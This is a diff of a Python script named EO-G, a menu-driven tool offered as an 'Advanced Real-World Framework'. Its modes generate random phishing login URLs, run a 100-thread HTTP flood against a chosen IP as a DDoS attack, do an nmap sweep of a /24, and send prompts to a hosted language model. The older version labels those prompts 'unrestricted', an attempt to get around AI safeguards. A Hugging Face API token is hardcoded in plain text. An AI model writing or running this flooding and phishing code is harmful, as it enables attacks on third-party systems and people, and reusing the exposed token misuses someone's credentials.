@@ -6,22 +6,22 @@ import string
 from colorama import Fore, Style
 
 class EO_G:
-    def __init__(self, model_id=None):
-        self.api_url = "https://api-inference.huggingface.co/models"
-        self.headers = {
-            "Authorization": "Bearer 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"  # Replace with your actual Hugging Face API key
+    def __init__(self):
+        # Replace with your Hugging Face API key
+        self.api_key = "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"
+        self.api_url = "https://api-inference.huggingface.co/models/gpt2"
+        self.headers = {"Authorization": f"Bearer {self.api_key}"}
+        self.modes = {
+            1: "Generate Code",
+            2: "Phishing Link",
+            3: "DDOS Attack",
+            4: "Device Attack",
+            5: "AI Chat Assistant",
+            6: "Exit"
         }
-        self.modes = ["Code Generator", "Phishing", "DDOS", "Device Attack", "AI Chat Assistant"]
-        self.active_mode = None
-
-        if model_id:
-            self.model_id = model_id
-            self.api_url += f"/{model_id}"
-        else:
-            self.model_id = None
 
     def display_banner(self):
-        """Displays a purple banner."""
+        """Displays a banner."""
         banner = f"""
 {Fore.MAGENTA}
  ███████╗ ██████╗       ██████╗  ██████╗ 
@@ -30,101 +30,110 @@ class EO_G:
  ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
  ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
  ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
-        Simplified GPT-J Framework
+      Advanced Real-World Framework
 {Style.RESET_ALL}
         """
         print(banner)
 
-    def generate_response(self, prompt):
-        """Generates a response using GPT-J via API."""
+    def generate_response(self, prompt, context="general"):
+        """Generates a response using GPT API."""
+        refined_prompt = f"Context: {context}\nPrompt: {prompt}"
         payload = {
-            "inputs": prompt,
+            "inputs": refined_prompt,
             "parameters": {
                 "max_length": 300,
-                "temperature": 0.9
+                "temperature": 0.7
             }
         }
         try:
-            response = requests.post(self.api_url, json=payload, headers=self.headers)
-            response.raise_for_status()  # Raise an error for bad responses
+            response = requests.post(self.api_url, headers=self.headers, json=payload)
+            response.raise_for_status()
             return response.json()[0]['generated_text']
         except requests.exceptions.RequestException as e:
-            return f"Error with API request: {e}"
+            return f"API Request Error: {e}"
         except KeyError:
-            return "No response generated from GPT-J."
+            return "No response generated."
 
     def generate_code(self, description):
-        """Generates unrestricted code using GPT-J via API."""
-        prompt = f"Generate unrestricted {description} code. Include detailed comments."
+        """Generates code using the GPT API."""
         print(f"[EO-G] Generating code for: {description}")
-        return self.generate_response(prompt)
+        return self.generate_response(description, context="code generation")
 
-    def phishing_link(self, target):
-        """Generates an undetectable phishing URL."""
+    def phishing_link(self):
+        """Generates a random phishing link."""
         domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".com"
-        return f"http://{domain}/login"
+        phishing_url = f"http://{domain}/login"
+        with open("phishing_links.log", "a") as log_file:
+            log_file.write(phishing_url + "\n")
+        print(f"[EO-G] Phishing link generated: {phishing_url}")
+        return phishing_url
 
     def ddos_attack(self, target_ip):
-        """Performs a DDOS attack on a given target IP."""
-        print(f"[EO-G] Initiating DDOS on {target_ip}")
-        def ddos():
+        """Performs a DDOS attack."""
+        print(f"[EO-G] Initiating DDOS attack on {target_ip}")
+
+        def ddos_thread():
             while True:
                 try:
                     requests.get(f"http://{target_ip}")
                 except Exception as e:
-                    print(f"Error in DDOS attack thread: {e}")
+                    print(f"Error in DDOS thread: {e}")
 
         threads = []
-        for _ in range(50):  # Spawn 50 threads for the attack
-            thread = threading.Thread(target=ddos)
+        for _ in range(100):  # Adjust thread count as needed
+            thread = threading.Thread(target=ddos_thread)
             threads.append(thread)
             thread.start()
         return f"[EO-G] DDOS attack launched on {target_ip}."
 
     def device_attack(self, ip):
-        """Finds devices on the same network as the target IP."""
-        print(f"[EO-G] Scanning devices near IP: {ip}")
-        # Perform a ping sweep or network scan (Example uses nmap or similar tools)
+        """Performs a network scan using Nmap."""
+        print(f"[EO-G] Scanning devices on the network near {ip}")
         try:
             devices = os.popen(f"nmap -sP {ip}/24").read()
+            print(devices)
             return devices
         except Exception as e:
-            return f"Error scanning network: {e}"
+            return f"Error during network scan: {e}"
 
     def ai_chat_assistant(self, query):
-        """Handles unrestricted user queries."""
-        print(f"[EO-G] Handling query: {query}")
-        return self.generate_response(query)
+        """Handles queries using the GPT API."""
+        print(f"[EO-G] Processing query: {query}")
+        return self.generate_response(query, context="chat assistant")
 
     def execute(self):
         """Main execution loop."""
         self.display_banner()
-        print("[EO-G] Welcome to EO-G: The Simplified GPT-J Framework")
-        print(f"Modes available: {', '.join(self.modes)}")
-        while True:
-            command = input("[EO-G] Enter your command: ").strip()
-            if command.lower() == "exit":
-                print("[EO-G] Exiting framework...")
-                break
-            elif command.startswith("mode"):
-                _, mode = command.split(" ", 1)
-                if mode in self.modes:
-                    self.active_mode = mode
-                    print(f"[EO-G] Mode switched to: {mode}")
-                else:
-                    print("[EO-G] Invalid mode selected.")
-            elif "generate" in command and "code" in command:
-                print(self.generate_code(command))
-            elif "phishing" in command:
-                print(self.phishing_link("target_user"))
-            elif "ddos" in command:
-                print(self.ddos_attack("192.168.1.1"))
-            elif "attack device" in command:
-                print(self.device_attack("192.168.1"))
-            else:
-                print(self.ai_chat_assistant(command))
+        print("[EO-G] Welcome to EO-G: The Advanced Real-World Framework")
 
+        while True:
+            print("\n[EO-G] Select an option:")
+            for num, mode in self.modes.items():
+                print(f" {num}: {mode}")
+            try:
+                choice = int(input("[EO-G] Enter the number of your choice: "))
+                if choice == 1:
+                    description = input("[EO-G] Describe the code to generate: ")
+                    print(self.generate_code(description))
+                elif choice == 2:
+                    print(f"[EO-G] Phishing link: {self.phishing_link()}")
+                elif choice == 3:
+                    target_ip = input("[EO-G] Enter target IP for DDOS attack: ")
+                    print(self.ddos_attack(target_ip))
+                elif choice == 4:
+                    ip_range = input("[EO-G] Enter IP range (e.g., 192.168.1.0): ")
+                    print(self.device_attack(ip_range))
+                elif choice == 5:
+                    query = input("[EO-G] Enter your query: ")
+                    print(self.ai_chat_assistant(query))
+                elif choice == 6:
+                    print("[EO-G] Exiting... Goodbye!")
+                    break
+                else:
+                    print("[EO-G] Invalid choice. Please try again.")
+            except ValueError:
+                print("[EO-G] Please enter a valid number.")
 
 if __name__ == "__main__":
-    eog = EO_G(model_id="gpt2")  # Use the "gpt2" model
+    eog = EO_G()
     eog.execute()
